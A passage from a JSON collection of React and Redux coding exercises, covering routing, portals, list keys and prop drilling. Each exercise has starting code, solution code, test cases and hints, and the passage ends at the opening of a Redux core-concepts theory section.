Posts</h2>\n    <ul>\n      {blogPosts.map(post => (\n        <li key={post.id}>\n          <Link to={`/posts/${post.id}`}>{post.title}</Link>\n        </li>\n      ))}\n    </ul>\n  </div>\n);\n\n// 4. Blog Post Detail Page Component\nconst PostDetailPage = ({ match }) => {\n  const postId = match.params.postId; // Get postId from match.params\n  const post = blogPosts.find(p => p.id === postId); // Find the post\n\n  if (!post) {\n    return (\n      <div>\n        <h2>Post Not Found</h2>\n        <p>The blog post with ID \"{postId}\" does not exist.</p>\n        <Link to=\"/posts\">Back to all posts</Link>\n      </div>\n    );\n  }\n\n  return (\n    <div>\n      <h2>{post.title}</h2>\n      <p>{post.content}</p>\n      <Link to=\"/posts\">Back to all posts</Link>\n    </div>\n  );\n};\n\n// 5. Not Found Page Component\nconst NotFoundPage = () => (\n  <div>\n    <h1>404 - Page Not Found</h1>\n    <p>The page you are looking for does not exist.</p>\n    <Link to=\"/\">Go to Home</Link>\n  </div>\n);\n\nfunction App() {\n  return (\n    <BrowserRouter>\n      <nav style={{ padding: '10px', backgroundColor: '#f0f0f0', borderBottom: '1px solid #ddd' }}>\n        <Link to=\"/\" style={{ margin: '0 10px' }}>Home</Link>\n        <Link to=\"/about\" style={{ margin: '0 10px' }}>About</Link>\n        <Link to=\"/posts\" style={{ margin: '0 10px' }}>Blog</Link>\n      </nav>\n      <div style={{ padding: '20px' }}>\n        <Switch>\n          {/* Define all routes here */}\n          <Route exact path=\"/\" component={HomePage} />\n          <Route path=\"/about\" component={AboutPage} />\n          <Route exact path=\"/posts\" component={PostsListPage} />\n          <Route path=\"/posts/:postId\" component={PostDetailPage} />\n          {/* Catch-all for 404 - must be last */}\n          <Route component={NotFoundPage} />\n        </Switch>\n      </div>\n    </BrowserRouter>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Navigate to `/`: Should display 'Welcome to Our Blog!' and links.",
            "Navigate to `/about`: Should display 'About This Blog'.",
            "Navigate to `/posts`: Should display 'All Blog Posts' with clickable titles for each mock post.",
            "Click on 'First Steps with React' link from `/posts`: Should navigate to `/posts/1` and display its content.",
            "Manually navigate to `/posts/999` (non-existent post): Should display 'Post Not Found'.",
            "Manually navigate to `/nonexistent-route`: Should display '404 - Page Not Found'.",
            "Verify browser's back/forward buttons work correctly for all navigated paths."
          ],
          "hints": [
            "Remember to use `exact` for routes that should only match the precise path (e.g., `/`).",
            "For dynamic segments like `postId`, define the `Route` path as `/posts/:postId`.",
            "Inside the component rendered by a dynamic route (e.g., `PostDetailPage`), access the parameter using `props.match.params.postId` (in v5).",
            "`Switch` ensures only one route renders. Place your 404 route last within the `Switch` to act as a fallback."
          ],
          "tags": [
            "React",
            "React Router",
            "Routing",
            "SPA",
            "Navigation",
            "Blog"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_components",
            "javascript_arrays_map"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_react_routing"
          ]
        },
        {
          "id": "task_react_portals_1",
          "title": "Build a Simple Confirmation Modal with React Portals",
          "description": "\nCreate a React application that features a confirmation modal implemented using React Portals. The modal should appear when a user clicks a button in the main application content.\n\nRequirements:\n\n1.  **Modal Component (`ConfirmationModal`)**: \n    *   This component should be a functional component.\n    *   It should accept `isOpen` (boolean), `onClose` (function), `onConfirm` (function), and `children` (modal content) as props.\n    *   It should use `ReactDOM.createPortal` to render its content into a dedicated DOM node outside the main React app's root (e.g., `<div id=\"modal-root\"></div>` in `public/index.html`).\n    *   The modal should have an overlay that darkens the background and closes the modal when clicked (unless the click is on the modal content itself).\n    *   The modal content should have a 'Cancel' button (calls `onClose`) and a 'Confirm' button (calls `onConfirm`).\n\n2.  **App Component**: \n    *   Contains a button that toggles the `ConfirmationModal`'s `isOpen` state.\n    *   Implement `onClose` and `onConfirm` functions that log messages to the console (e.g., 'Modal closed' and 'Action confirmed!').\n\n**Note:** Assume you have added `<div id=\"modal-root\"></div>` to your `public/index.html` file (e.g., just before the closing `</body>` tag).\n",
          "difficulty": "hard",
          "startingCode": "import React, { useState } from 'react';\nimport ReactDOM from 'react-dom';\n\n// Assume public/index.html has <div id=\"modal-root\"></div>\n\nconst ConfirmationModal = ({ isOpen, onClose, onConfirm, children }) => {\n  // If the modal is not open, don't render anything\n  if (!isOpen) return null;\n\n  // Find the portal root DOM node\n  const portalRoot = document.getElementById('modal-root');\n  if (!portalRoot) {\n    console.error('Modal root element #modal-root not found!');\n    return null;\n  }\n\n  return ReactDOM.createPortal(\n    <div style={{\n      position: 'fixed',\n      top: 0,\n      left: 0,\n      right: 0,\n      bottom: 0,\n      backgroundColor: 'rgba(0,0,0,0.5)',\n      display: 'flex',\n      justifyContent: 'center',\n      alignItems: 'center',\n      zIndex: 1000\n    }} onClick={onClose}> {/* Clicking overlay closes modal */}\n      <div style={{\n        backgroundColor: 'white',\n        padding: '20px',\n        borderRadius: '8px',\n        minWidth: '350px',\n        boxShadow: '0 4px 8px rgba(0,0,0,0.2)',\n        zIndex: 1001\n      }} onClick={e => e.stopPropagation()}> {/* Clicking modal content does not close */}\n        {children}\n        <div style={{ marginTop: '20px', textAlign: 'right' }}>\n          {/* TODO: Add Cancel and Confirm buttons */}\n          <button style={{ marginRight: '10px' }}>Cancel</button>\n          <button>Confirm</button>\n        </div>\n      </div>\n    </div>,\n    portalRoot\n  );\n};\n\nfunction App() {\n  const [isModalOpen, setIsModalOpen] = useState(false);\n\n  const handleOpenModal = () => setIsModalOpen(true);\n  const handleCloseModal = () => {\n    console.log('Modal closed.');\n    setIsModalOpen(false);\n  };\n  const handleConfirmAction = () => {\n    console.log('Action confirmed!');\n    setIsModalOpen(false);\n  };\n\n  return (\n    <div style={{ padding: '20px', height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>\n      <h1>React Portal Modal Demo</h1>\n      <p>Click the button below to open a confirmation modal.</p>\n      <button onClick={handleOpenModal}>Open Confirmation</button>\n\n      <ConfirmationModal\n        isOpen={isModalOpen}\n        onClose={handleCloseModal}\n        onConfirm={handleConfirmAction}\n      >\n        <h2>Are you sure?</h2>\n        <p>This action cannot be undone.</p>\n      </ConfirmationModal>\n\n      <div style={{ marginTop: '50px', border: '1px dashed lightgray', padding: '20px' }}>\n        <p>This is some content that the modal will appear on top of, demonstrating how it breaks out of the DOM hierarchy.</p>\n        <p>It's often hard to make modals cover the whole screen and ignore parent CSS rules without portals.</p>\n      </div>\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React, { useState } from 'react';\nimport ReactDOM from 'react-dom';\n\n// Assume public/index.html has <div id=\"modal-root\"></div>\n\nconst ConfirmationModal = ({ isOpen, onClose, onConfirm, children }) => {\n  // If the modal is not open, don't render anything\n  if (!isOpen) return null;\n\n  // Find the portal root DOM node\n  const portalRoot = document.getElementById('modal-root');\n  if (!portalRoot) {\n    console.error('Modal root element #modal-root not found!');\n    return null;\n  }\n\n  return ReactDOM.createPortal(\n    <div style={{\n      position: 'fixed',\n      top: 0,\n      left: 0,\n      right: 0,\n      bottom: 0,\n      backgroundColor: 'rgba(0,0,0,0.5)',\n      display: 'flex',\n      justifyContent: 'center',\n      alignItems: 'center',\n      zIndex: 1000\n    }} onClick={onClose}> {/* Clicking overlay closes modal */}\n      <div style={{\n        backgroundColor: 'white',\n        padding: '20px',\n        borderRadius: '8px',\n        minWidth: '350px',\n        boxShadow: '0 4px 8px rgba(0,0,0,0.2)',\n        zIndex: 1001\n      }} onClick={e => e.stopPropagation()}> {/* Clicking modal content does not close */}\n        {children}\n        <div style={{ marginTop: '20px', textAlign: 'right' }}>\n          <button onClick={onClose} style={{ marginRight: '10px', padding: '8px 15px', borderRadius: '5px', border: '1px solid #ccc', backgroundColor: '#f0f0f0', cursor: 'pointer' }}>Cancel</button>\n          <button onClick={onConfirm} style={{ padding: '8px 15px', borderRadius: '5px', border: 'none', backgroundColor: '#007bff', color: 'white', cursor: 'pointer' }}>Confirm</button>\n        </div>\n      </div>\n    </div>,\n    portalRoot\n  );\n};\n\nfunction App() {\n  const [isModalOpen, setIsModalOpen] = useState(false);\n\n  const handleOpenModal = () => setIsModalOpen(true);\n  const handleCloseModal = () => {\n    console.log('Modal closed.');\n    setIsModalOpen(false);\n  };\n  const handleConfirmAction = () => {\n    console.log('Action confirmed!');\n    setIsModalOpen(false);\n  };\n\n  return (\n    <div style={{ padding: '20px', height: '100vh', display: 'flex', flexDirection: 'column', alignItems: 'center' }}>\n      <h1>React Portal Modal Demo</h1>\n      <p>Click the button below to open a confirmation modal.</p>\n      <button onClick={handleOpenModal} style={{ padding: '10px 20px', fontSize: '1.1em', cursor: 'pointer' }}>Open Confirmation</button>\n\n      <ConfirmationModal\n        isOpen={isModalOpen}\n        onClose={handleCloseModal}\n        onConfirm={handleConfirmAction}\n      >\n        <h2>Are you sure?</h2>\n        <p>This action cannot be undone.</p>\n      </ConfirmationModal>\n\n      <div style={{ marginTop: '50px', border: '1px dashed lightgray', padding: '20px' }}>\n        <p>This is some content that the modal will appear on top of, demonstrating how it breaks out of the DOM hierarchy.</p>\n        <p>It's often hard to make modals cover the whole screen and ignore parent CSS rules without portals.</p>\n      </div>\n    </div>\n  );\n}\n\nexport default App;\n",
          "testCases": [
            "Initial state: Modal should not be visible.",
            "Click 'Open Confirmation': Modal should appear centered on the screen with a semi-transparent background. Console should *not* log 'Action confirmed!' or 'Modal closed'.",
            "Click 'Cancel' button inside modal: Modal should close. Console should log 'Modal closed.'.",
            "Click 'Open Confirmation' again. Click outside the modal content (on the dark overlay): Modal should close. Console should log 'Modal closed.'.",
            "Click 'Open Confirmation' again. Click 'Confirm' button inside modal: Modal should close. Console should log 'Action confirmed!'.",
            "Clicking inside the modal content (but not on buttons) should not close the modal.",
            "Inspect the DOM: Verify that the modal's `div` is rendered as a direct child of `#modal-root`, not within the `App` component's DOM structure."
          ],
          "hints": [
            "Remember that `ReactDOM.createPortal` takes two arguments: the React element to render and the DOM element to mount it into.",
            "Use `event.stopPropagation()` on the modal's content wrapper to prevent clicks inside the modal from bubbling up and closing the modal via the overlay's `onClick`.",
            "Ensure the modal's `position` is `fixed` and `zIndex` is high to cover the entire viewport."
          ],
          "tags": [
            "React",
            "Portals",
            "Modals",
            "DOM Manipulation",
            "UX",
            "Hooks"
          ],
          "timeEstimate": 60,
          "prerequisites": [
            "react_hooks",
            "dom_manipulation_basics"
          ],
          "complexity": 8,
          "interviewRelevance": 8,
          "learningPath": "advanced",
          "relatedConcepts": [
            "theory_react_portals"
          ]
        },
        {
          "id": "task_react_keys_1",
          "title": "Build a Dynamic Checklist with Stable Keys",
          "description": "\nCreate a React functional component `Checklist` that manages a dynamic list of items. Each item should have a unique ID, a text description, and a checkbox to mark it as complete. The component should allow:\n\n1.  **Adding a new item**: A button to add a new item (e.g., 'New Task N') to the **top** of the list.\n2.  **Toggling completion**: Each item's checkbox should toggle its `completed` status.\n3.  **Removing an item**: A button next to each item to remove it from the list.\n\n**Crucially, use a unique and stable `id` for each list item's `key` prop.** Explain in comments how this choice affects the behavior of checkboxes when items are added to the beginning or removed from the middle, versus using `index` as a key.\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\nlet nextItemId = 1;\n\nfunction ChecklistItem({ item, onToggleComplete, onRemove }) {\n  return (\n    <li style={{ display: 'flex', alignItems: 'center', margin: '5px 0', border: '1px solid #eee', padding: '8px', borderRadius: '4px' }}>\n      <input\n        type=\"checkbox\"\n        checked={item.completed}\n        onChange={() => onToggleComplete(item.id)}\n        style={{ marginRight: '10px' }}\n      />\n      <span style={{ textDecoration: item.completed ? 'line-through' : 'none' }}>\n        {item.text} (ID: {item.id})\n      </span>\n      <button\n        onClick={() => onRemove(item.id)}\n        style={{ marginLeft: 'auto', backgroundColor: '#dc3545', color: 'white', border: 'none', padding: '5px 10px', borderRadius: '3px', cursor: 'pointer' }}\n      >\n        Remove\n      </button>\n    </li>\n  );\n}\n\nfunction Checklist() {\n  const [items, setItems] = useState([\n    { id: nextItemId++, text: 'Learn React Keys', completed: false },\n    { id: nextItemId++, text: 'Understand PropTypes', completed: true },\n    { id: nextItemId++, text: 'Implement a Modal', completed: false }\n  ]);\n\n  const handleAddItem = () => {\n    const newItem = { id: nextItemId++, text: `New Task ${nextItemId - 1}`, completed: false };\n    // TODO: Add new item to the beginning of the list\n  };\n\n  const handleToggleComplete = (id) => {\n    setItems(items.map(item => \n      item.id === id ? { ...item, completed: !item.completed } : item\n    ));\n  };\n\n  const handleRemoveItem = (idToRemove) => {\n    // TODO: Remove item by id\n  };\n\n  return (\n    <div style={{ padding: '20px', maxWidth: '500px', margin: 'auto' }}>\n      <h1>My Dynamic Checklist</h1>\n      <button \n        onClick={handleAddItem} \n        style={{ marginBottom: '15px', padding: '10px 15px', backgroundColor: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}\n      >\n        Add New Task to Top\n      </button>\n      <ul style={{ listStyleType: 'none', padding: 0 }}>\n        {items.map(item => (\n          <ChecklistItem \n            key={item.id} // TODO: Ensure correct key usage (stable ID)\n            item={item} \n            onToggleComplete={handleToggleComplete} \n            onRemove={handleRemoveItem} \n          />\n        ))}\n      </ul>\n      <p style={{ marginTop: '20px', fontSize: '0.9em', color: '#555' }}>\n        Try checking/unchecking items, then add a new item to the top or remove one from the middle.\n        Observe how the checkbox states behave. Then, try changing `key={item.id}` to `key={index}` in the map function and re-test. \n        You should see checkboxes behave unexpectedly with `key={index}` when the list changes order or size.\n      </p>\n    </div>\n  );\n}\n\nexport default Checklist;\n",
          "solutionCode": "import React, { useState } from 'react';\n\nlet nextItemId = 1;\n\nfunction ChecklistItem({ item, onToggleComplete, onRemove }) {\n  return (\n    <li style={{ display: 'flex', alignItems: 'center', margin: '5px 0', border: '1px solid #eee', padding: '8px', borderRadius: '4px' }}>\n      <input\n        type=\"checkbox\"\n        checked={item.completed}\n        onChange={() => onToggleComplete(item.id)}\n        style={{ marginRight: '10px' }}\n      />\n      <span style={{ textDecoration: item.completed ? 'line-through' : 'none' }}>\n        {item.text} (ID: {item.id})\n      </span>\n      <button\n        onClick={() => onRemove(item.id)}\n        style={{ marginLeft: 'auto', backgroundColor: '#dc3545', color: 'white', border: 'none', padding: '5px 10px', borderRadius: '3px', cursor: 'pointer' }}\n      >\n        Remove\n      </button>\n    </li>\n  );\n}\n\nfunction Checklist() {\n  const [items, setItems] = useState([\n    { id: nextItemId++, text: 'Learn React Keys', completed: false },\n    { id: nextItemId++, text: 'Understand PropTypes', completed: true },\n    { id: nextItemId++, text: 'Implement a Modal', completed: false }\n  ]);\n\n  const handleAddItem = () => {\n    const newItem = { id: nextItemId++, text: `New Task ${nextItemId - 1}`, completed: false };\n    setItems([newItem, ...items]); // Solution: Add new item to the beginning\n  };\n\n  const handleToggleComplete = (id) => {\n    setItems(items.map(item => \n      item.id === id ? { ...item, completed: !item.completed } : item\n    ));\n  };\n\n  const handleRemoveItem = (idToRemove) => {\n    setItems(items.filter(item => item.id !== idToRemove)); // Solution: Remove item by id\n  };\n\n  return (\n    <div style={{ padding: '20px', maxWidth: '500px', margin: 'auto' }}>\n      <h1>My Dynamic Checklist</h1>\n      <button \n        onClick={handleAddItem} \n        style={{ marginBottom: '15px', padding: '10px 15px', backgroundColor: '#28a745', color: 'white', border: 'none', borderRadius: '5px', cursor: 'pointer' }}\n      >\n        Add New Task to Top\n      </button>\n      <ul style={{ listStyleType: 'none', padding: 0 }}>\n        {items.map(item => (\n          <ChecklistItem \n            key={item.id} // Solution: Using stable item.id as key\n            item={item} \n            onToggleComplete={handleToggleComplete} \n            onRemove={handleRemoveItem} \n          />\n        ))}\n      </ul>\n      <p style={{ marginTop: '20px', fontSize: '0.9em', color: '#555' }}>\n        **Explanation of Key Usage:**\n        Using `item.id` as the `key` is crucial here because `id` is a stable, unique identifier for each task.\n        If a new item is added to the beginning, or an item is removed from the middle, the `id` of existing items remains unchanged.\n        React uses these stable `id`s to correctly identify and match existing `ChecklistItem` components in the new list with their previous instances.\n        This ensures that the internal state of each `ChecklistItem` (specifically, its checkbox `checked` state, which is implicitly managed by the DOM input element linked to `item.completed`) is preserved and correctly associated with the original task, even if its position in the array (and thus its `index`) changes.\n        \n        In contrast, if `key={index}` were used, when an item is added to the beginning or removed from the middle, the indices of all subsequent items would shift. React would then see that the item at `index 0` is now a different item, and try to re-use the *previous* `index 0`'s DOM element and its state for the *new* item at `index 0`, leading to incorrect checkbox states or other unexpected behavior.\n      </p>\n    </div>\n  );\n}\n\nexport default Checklist;\n",
          "testCases": [
            "Initial render: Three items should be displayed with their correct completed status.",
            "Toggle completion: Clicking a checkbox should toggle its item's completion status correctly.",
            "Add new item: Click 'Add New Task to Top'. A new item should appear at the very top of the list. Verify that existing items (below the new one) retain their original checked/unchecked states.",
            "Remove item from middle: Check 'Learn React Keys'. Then, remove 'Understand PropTypes'. Verify that 'Learn React Keys' remains checked, and the list re-orders correctly without state loss for 'Learn React Keys'.",
            "Verify that no React warnings about keys appear in the console during any operations."
          ],
          "hints": [
            "Ensure each new item object has a unique `id`. You can use `nextItemId++` for this.",
            "To add an item to the beginning of an array in state, use the spread operator: `setItems([newItem, ...currentItems])`.",
            "To remove an item by ID, use `filter()` on the `items` array to create a new array excluding the item with the matching ID.",
            "The `key` prop should be placed on the `<li>` element (or the top-level element returned by `map`) and its value should be a stable unique identifier from your data.",
            "Pay close attention to the `key` prop in the `map` function. This is the core of the task."
          ],
          "tags": [
            "React",
            "Lists",
            "Keys",
            "State Management",
            "Performance",
            "Hooks",
            "Debugging"
          ],
          "timeEstimate": 45,
          "prerequisites": [
            "react_hooks",
            "javascript_arrays"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "intermediate",
          "relatedConcepts": [
            "theory_react_keys"
          ]
        },
        {
          "id": "task_redux_problem_solved_1",
          "title": "Simulate Prop Drilling and Discuss Redux Solution",
          "description": "\nThis task involves demonstrating the 'prop drilling' problem in a React application and conceptually explaining how Redux would solve it.\n\n**Part 1: Simulate Prop Drilling (Coding Task)**\n\n1.  Create an `App` component that holds a `user` object in its state (e.g., `{ name: 'John Doe', theme: 'dark' }`).\n2.  Create three nested components: `ParentComponent` -> `ChildComponent` -> `GrandchildComponent`.\n3.  Pass the `user` object from `App` down to `GrandchildComponent` through `ParentComponent` and `ChildComponent` as props. Neither `ParentComponent` nor `ChildComponent` should directly use the `user` prop.\n4.  `GrandchildComponent` should display the user's `name` and `theme`.\n5.  Add a button in `GrandchildComponent` that, when clicked, attempts to change the `theme` property of the `user` object. You will need to pass a callback function (`onUpdateUserTheme`) from `App` down to `GrandchildComponent` as well, to simulate how state changes would propagate without a global store.\n\n**Part 2: Conceptual Explanation (Textual)**\n\nExplain how Redux would restructure this application to avoid prop drilling for both reading and updating the `user` state. Focus on the core Redux concepts (store, actions, reducers, `useSelector`/`useDispatch` or `connect`).\n",
          "difficulty": "medium",
          "startingCode": "import React, { useState } from 'react';\n\n// Part 1: Simulate Prop Drilling\n\n// GrandchildComponent: Displays user info and has a button to update theme\nfunction GrandchildComponent({ user, onUpdateUserTheme }) {\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', backgroundColor: '#f9f9f9' }}>\n      <h3>Grandchild Component</h3>\n      <p>User Name: <strong>{user.name}</strong></p>\n      <p>Current Theme: <strong>{user.theme}</strong></p>\n      <button onClick={() => onUpdateUserTheme(user.theme === 'dark' ? 'light' : 'dark')}>\n        Toggle Theme\n      </button>\n    </div>\n  );\n}\n\n// ChildComponent: Passes props down\nfunction ChildComponent({ user, onUpdateUserTheme }) {\n  // This component doesn't use 'user' or 'onUpdateUserTheme' directly\n  // TODO: Pass props to GrandchildComponent\n  return (\n    <div style={{ border: '1px dashed blue', padding: '10px', margin: '10px' }}>\n      <h4>Child Component (Intermediate)</h4>\n      <GrandchildComponent user={user} onUpdateUserTheme={onUpdateUserTheme} />\n    </div>\n  );\n}\n\n// ParentComponent: Passes props down\nfunction ParentComponent({ user, onUpdateUserTheme }) {\n  // This component doesn't use 'user' or 'onUpdateUserTheme' directly\n  // TODO: Pass props to ChildComponent\n  return (\n    <div style={{ border: '1px solid green', padding: '10px', margin: '10px' }}>\n      <h3>Parent Component (Intermediate)</h3>\n      <ChildComponent user={user} onUpdateUserTheme={onUpdateUserTheme} />\n    </div>\n  );\n}\n\n// App Component: Holds the source state and update logic\nfunction App() {\n  const [user, setUser] = useState({ name: 'John Doe', theme: 'dark' });\n\n  const handleUpdateUserTheme = (newTheme) => {\n    setUser(prevUser => ({ ...prevUser, theme: newTheme }));\n  };\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>Prop Drilling Demo</h1>\n      <p>App State User Theme: <strong>{user.theme}</strong></p>\n      {/* TODO: Pass props to ParentComponent */}\n      <ParentComponent user={user} onUpdateUserTheme={handleUpdateUserTheme} />\n    </div>\n  );\n}\n\nexport default App;\n",
          "solutionCode": "import React, { useState } from 'react';\n\n// Part 1: Simulate Prop Drilling\n\n// GrandchildComponent: Displays user info and has a button to update theme\nfunction GrandchildComponent({ user, onUpdateUserTheme }) {\n  return (\n    <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', backgroundColor: '#f9f9f9' }}>\n      <h3>Grandchild Component</h3>\n      <p>User Name: <strong>{user.name}</strong></p>\n      <p>Current Theme: <strong>{user.theme}</strong></p>\n      <button onClick={() => onUpdateUserTheme(user.theme === 'dark' ? 'light' : 'dark')}>\n        Toggle Theme\n      </button>\n    </div>\n  );\n}\n\n// ChildComponent: Passes props down\nfunction ChildComponent({ user, onUpdateUserTheme }) {\n  // This component doesn't use 'user' or 'onUpdateUserTheme' directly\n  return (\n    <div style={{ border: '1px dashed blue', padding: '10px', margin: '10px' }}>\n      <h4>Child Component (Intermediate)</h4>\n      <GrandchildComponent user={user} onUpdateUserTheme={onUpdateUserTheme} />\n    </div>\n  );\n}\n\n// ParentComponent: Passes props down\nfunction ParentComponent({ user, onUpdateUserTheme }) {\n  // This component doesn't use 'user' or 'onUpdateUserTheme' directly\n  return (\n    <div style={{ border: '1px solid green', padding: '10px', margin: '10px' }}>\n      <h3>Parent Component (Intermediate)</h3>\n      <ChildComponent user={user} onUpdateUserTheme={onUpdateUserTheme} />\n    </div>\n  );\n}\n\n// App Component: Holds the source state and update logic\nfunction App() {\n  const [user, setUser] = useState({ name: 'John Doe', theme: 'dark' });\n\n  const handleUpdateUserTheme = (newTheme) => {\n    setUser(prevUser => ({ ...prevUser, theme: newTheme }));\n  };\n\n  return (\n    <div style={{ padding: '20px' }}>\n      <h1>Prop Drilling Demo</h1>\n      <p>App State User Theme: <strong>{user.theme}</strong></p>\n      <ParentComponent user={user} onUpdateUserTheme={handleUpdateUserTheme} />\n    </div>\n  );\n}\n\nexport default App;\n\n/*\nPart 2: Conceptual Explanation of Redux Solution\n\nTo solve the prop drilling problem using Redux, the application structure would change as follows:\n\n1.  **Redux Store:** A single Redux store would be created to hold the global application state, including the `user` object.\n\n    ```javascript\n    // store.js\n    import { createStore } from 'redux';\n\n    const initialState = { user: { name: 'John Doe', theme: 'dark' } };\n\n    function userReducer(state = initialState, action) {\n      switch (action.type) {\n        case 'TOGGLE_THEME':\n          return { ...state, user: { ...state.user, theme: action.payload } };\n        default:\n          return state;\n      }\n    }\n\n    const store = createStore(userReducer);\n    export default store;\n    ```\n\n2.  **Provider:** The Redux store would be made available to the entire React component tree by wrapping the root `App` component (or a higher-level component) with a `Provider` from `react-redux`.\n\n    ```javascript\n    // index.js (or App.js)\n    import React from 'react';\n    import ReactDOM from 'react-dom';\n    import { Provider } from 'react-redux';\n    import store from './store';\n    import App from './App';\n\n    ReactDOM.render(\n      <Provider store={store}>\n        <App />\n      </Provider>,\n      document.getElementById('root')\n    );\n    ```\n\n3.  **Accessing State (useSelector):** The `GrandchildComponent` (or any other component needing the `user` state) would directly 'select' the `user` state from the Redux store using the `useSelector` hook, without needing props to be passed down through intermediate components.\n\n    ```javascript\n    // GrandchildComponent.js (Redux version)\n    import React from 'react';\n    import { useSelector, useDispatch } from 'react-redux';\n\n    function GrandchildComponent() {\n      const user = useSelector(state => state.user); // Directly select user from store\n      const dispatch = useDispatch();\n\n      const handleToggleTheme = () => {\n        const newTheme = user.theme === 'dark' ? 'light' : 'dark';\n        dispatch({ type: 'TOGGLE_THEME', payload: newTheme }); // Dispatch an action to update state\n      };\n\n      return (\n        <div style={{ border: '1px solid #ccc', padding: '15px', margin: '10px', backgroundColor: '#f9f9f9' }}>\n          <h3>Grandchild Component (Redux)</h3>\n          <p>User Name: <strong>{user.name}</strong></p>\n          <p>Current Theme: <strong>{user.theme}</strong></p>\n          <button onClick={handleToggleTheme}>\n            Toggle Theme\n          </button>\n        </div>\n      );\n    }\n    ```\n\n4.  **Updating State (useDispatch and Actions/Reducers):** To update the `theme`, the `GrandchildComponent` would `dispatch` an action (e.g., `TOGGLE_THEME`) to the Redux store. A `reducer` function defined in the Redux store would then process this action and return a new state, making the update predictable and centralized.\n\nWith Redux, the `ParentComponent` and `ChildComponent` in this example would become 'dumb' components, not needing to receive or pass down the `user` prop. They would simply render their children. This significantly reduces boilerplate and makes the application's data flow more explicit and easier to manage, especially in larger applications with complex state trees.\n*/\n",
          "testCases": [
            "**Part 1 (Coding):**\n1.  Initial render: The `GrandchildComponent` should display 'User Name: John Doe' and 'Current Theme: dark'.\n2.  Clicking 'Toggle Theme' button in `GrandchildComponent`: The displayed theme in `GrandchildComponent` should switch from 'dark' to 'light' and vice versa. The 'App State User Theme' in the `App` component should also update simultaneously.",
            "**Part 2 (Explanation):**\n1.  The explanation should clearly define the components of a Redux setup (store, provider, actions, reducers).\n2.  It should explicitly describe how `useSelector` replaces prop drilling for reading state.\n3.  It should explicitly describe how `useDispatch` and actions replace prop-drilled callbacks for updating state.\n4.  The explanation should highlight how intermediate components (`ParentComponent`, `ChildComponent`) would no longer need to pass down the state or the updater function."
          ],
          "hints": [
            "For Part 1, you just need to ensure `user` and `onUpdateUserTheme` are passed down correctly through all intermediate components.",
            "For Part 2, think about the three core principles of Redux: Single Source of Truth, State is Read-Only, and Changes with Pure Functions (Reducers).",
            "Consider the `react-redux` hooks: `useSelector` for reading state and `useDispatch` for dispatching actions.",
            "Illustrate the `action` structure and a simple `reducer` function that handles the theme toggle."
          ],
          "tags": [
            "Redux",
            "State Management",
            "Prop Drilling",
            "Architecture",
            "Hooks",
            "Conceptual"
          ],
          "timeEstimate": 75,
          "prerequisites": [
            "react_state",
            "react_props",
            "react_hooks"
          ],
          "complexity": 8,
          "interviewRelevance": 9,
          "learningPath": "advanced",
          "relatedConcepts": [
            "theory_redux_problem_solved"
          ]
        }
      ]
    }
  },
  {
    "id": "2291dfcd-50cf-4a3f-becb-ef644635536b",
    "startLine": 13600,
    "endLine": 13699,
    "processedDate": "2025-06-17T13:34:14.664Z",
    "content": {
      "logicalBlockInfo": {
        "suggestedEndLine": -1
      },
      "theory": [
        {
          "id": "theory_redux_core_concepts",
          "title": "Redux Core Concepts",
          "content": "Redux is a predictable state container for JavaScript apps, primarily used for managing application state. It helps you write applications that behave consistently across different environments (client, server, and native), and are easy to test. It provides a single source of truth for your application's state, making state changes predictable and debuggable.\n\n## Key Concepts\n\n### Store\nThe **Store** is a single JavaScript object that holds the entire application state tree. There should only be one store in a Redux application. It's responsible for:\n- Holding the application state.\n- Allowing access to the state via `getState()`.\n- Allowing state to be updated via `dispatch(action)`.\n- Registering listeners via `subscribe(listener)`.\n- Handling unregistering of listeners via the function returned by `subscribe(listener)`.\n\n### Actions\n**Actions** are plain JavaScript objects that describe *what happened*. They are the only way to send data from your application to the Red Redux store. Actions must have a `type` property, which is usually a string constant, indicating the type of action performed. Other properties can contain any necessary data.\n\n### Action Creators\n**Action Creators** are functions that create and return action objects. They are not strictly necessary but are a good practice to encapsulate action creation logic, making actions reusable and easier to manage.\n\n### Reducers\n**Reducers** are pure functions that take the current `state` and an `action` as arguments, and return a *new state*. They specify how the application's state changes in response to actions. Reducers must be pure (no side effects) and never mutate the original state directly; instead, they should return a new state object if changes are made, or the original state if no changes are needed.\n\n### Dispatch\n`dispatch` is the method used to send actions to the Redux store. When an action is dispatched, Redux will pass it to the root reducer, which then processes the action and updates the state. It's the only way to trigger a state change.\n\n### Selectors\n**Selectors** are functions used to extract specific pieces of data from the Redux store's state. They are crucial for optimizing performance by preventing unnecessary re-renders in connected components when unrelated parts of the state change. They also encapsulate the logic for deriving data, making it reusable and easier to test.\n",
          "examples": [
            {
              "id": "example_redux_core_1",
              "title": "Action and Action Creator",
              "code": "const ADD_TODO = 'ADD_TODO';\n\n// Action\nconst addTodoAction = {\n  type: ADD_TODO,\n  payload: 'Learn Redux'\n};\n\n// Action Creator\nfunction addTodo(text) {\n  return {\n    type: ADD_TODO,\n    payload: text\n  };\n}",
              "explanation": "This example defines an action type constant and demonstrates both a raw action object and an action creator function `addTodo` that returns such an action. Action creators provide a clean way to construct actions.",
              "language": "typescript"
            },
            {
              "id": "example_redux_core_2",
              "title": "Reducer Example",
              "code": "function todosReducer(state = [], action) {\n  switch (action.type) {\n    case 'ADD_TODO':\n      return [...state, { text: action.payload, completed: false }];\n    case 'TOGGLE_TODO':\n      return state.map((todo, index) => \n        index === action.index \n          ? { ...todo, completed: !todo.completed } \n          : todo\n      );\n    default:\n      return state;\n  }\n}",
              "explanation": "This `todosReducer` function is a pure function. It takes the current state (defaulting to an empty array) and an action. Based on the action type, it returns a *new* state array using spread syntax (`...`) and `map` to ensure immutability. For unrecognized actions, it returns the current state.",
              "language": "typescript"
            },
            {
              "id": "example_redux_core_3",
              "title": "Dispatching an Action",
